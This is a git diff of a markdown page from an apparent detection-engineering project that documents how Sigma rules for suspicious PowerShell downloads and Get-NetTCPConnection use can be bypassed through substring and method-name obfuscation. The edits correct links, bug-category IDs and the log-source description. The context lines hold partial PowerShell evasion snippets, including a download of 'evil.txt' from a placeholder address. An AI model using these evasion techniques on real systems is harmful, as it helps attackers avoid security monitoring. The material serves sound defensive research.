@@ -21,7 +21,7 @@ This exists when an attacker can manipulate the input data being collected, and 
 ---
 #### Example 1: Sigma rule [Suspicious PowerShell Download](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/powershell/powershell_classic/posh_pc_susp_download.yml)
 
-The first example was given in [Detection Logic Bug Theory](theory_1_detection_logic_bug_theory.md).
+The first example was given in [Detection Logic Bug Theory](Detection_Logic_Bug_Theory.md).
 
 Relevant detection logic component from the Sigma rule.
 ```yaml
@@ -48,7 +48,7 @@ Below are examples of bypasses (False Negatives) that result from the presence o
 
 ##### Bypass 1: Method name obfuscation followed by variable usage
 
-> ADE01-01 Reformatting in Actions - Substring Manipulation
+> ADE1-01 Reformatting in Actions - Substring Manipulation
 
 ```PowerShell
 $url = "ADDRESS\evil.txt";
@@ -60,7 +60,7 @@ Set-Content -Path "DIRECTORY_TO_WRITE_TO\evil.txt" -Value $file
 
 ##### Bypass 2: Method name obfuscation followed by variable usage (Short)
 
-> ADE01-01 Bug Category: Reformatting in Actions - Substring Manipulation
+> ADE1-01 Bug Category: Reformatting in Actions - Substring Manipulation
 
 ```PowerShell
 $url = "ADDRESS\evil.txt";
@@ -127,7 +127,7 @@ The ADE framework will also catch detection rules like this, as the query logic 
 
 ##### Bypass 1: Method name obfuscation followed by variable usage (Short)
 
-> ADE01-01 Bug Category: Reformatting in Actions - Substring Manipulation
+> ADE1-01 Bug Category: Reformatting in Actions - Substring Manipulation
 
 ```shell
 ## Persistence
@@ -169,17 +169,17 @@ falsepositives:
 level: low
 ```
 
-This detection logic relies on process creation records that include Get-NETTCPConnection substring.
+This detection logic relies on PowerShell records that include Get-NETTCPConnection substring.
 
 The *bug* is the reliance on substrings that are mutable by the attacker, or **ADE1-01 Substring Manipulation**.
 
 ##### Bypass 1: Method name obfuscation
 
-> ADE01-01 Bug Category: Reformatting in Actions - Substring Manipulation
+> ADE1-01 Bug Category: Reformatting in Actions - Substring Manipulation
 
-The logsource category ps_classic_start in Sigma is for Windows Security Event ID `4688 (process creation)`. Logged info includes; `NewProcessName`, `CommandLine` (if enabled), `ParentProcessName`, `Process ID`, `User`, etc. 
+The logsource category ps_classic_start in Sigma is for PowerShell Event ID [400 (PowerShell CommandLine Logging)](https://github.com/SigmaHQ/pySigma-pipeline-windows/blob/main/sigma/pipelines/windows/windows.py#L10). Logged info includes; `CommandName`, `CommandLine`, `ScriptName`, etc. 
 
-The field value that includes the substring would be `Commandline`. The command below utilizes `Get-NetTCPConnection` to dump connection information as json into `tcp.json` while creating a False Negative.
+The field value that includes the substring would be `CommandLine`. The command below utilizes `Get-NetTCPConnection` to dump connection information as json into `tcp.json` while creating a False Negative.
 
 ```powershell
 $ps = [System.Management.Automation.PowerShell]::Create();
@@ -193,8 +193,6 @@ $result | ConvertTo-Json -Depth 4 | Set-Content DIRECTORY_TO_WRITE_TO\tcp.json -
 ---
 
 **Contents**
-
-
 - [README.md](README.md)
 - [Detection Logic Bug Theory](Detection_Logic_Bug_Theory.md)
 - [Detection Logic Bug Taxonomy](Detection_Logic_Bug_Taxonomy.md)
